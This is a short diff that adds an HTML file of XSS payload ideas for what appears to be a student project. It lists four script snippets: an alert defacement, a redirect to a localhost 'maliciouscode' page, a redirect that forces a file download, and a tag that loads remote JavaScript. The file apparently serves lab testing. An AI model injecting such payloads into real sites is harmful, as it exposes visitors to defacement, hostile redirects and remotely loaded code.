@@ -1,0 +1,19 @@
+<!-- 
+    some ideas for js code that can be executed for XSS
+    copy and paste these into the majorproject folder
+-->
+
+<!-- vandalism-->
+<script>alert("you have been hacked")</script> 
+
+<!-- redirect to (malicious?) site-->
+<script>window.location.replace("http://localhost/maliciouscode/index.html");</script>
+
+<!-- attempt download of (malicious?) file via redirect-->
+<script>
+window.location.
+replace("https://upload.wikimedia.org/wikipedia/commons/c/c2/GitHub_Invertocat_Logo.svg?download")
+</script>
+
+<!-- execute js code from another site -->
+<script src="http://localhost/maliciouscode/script.js"></script>
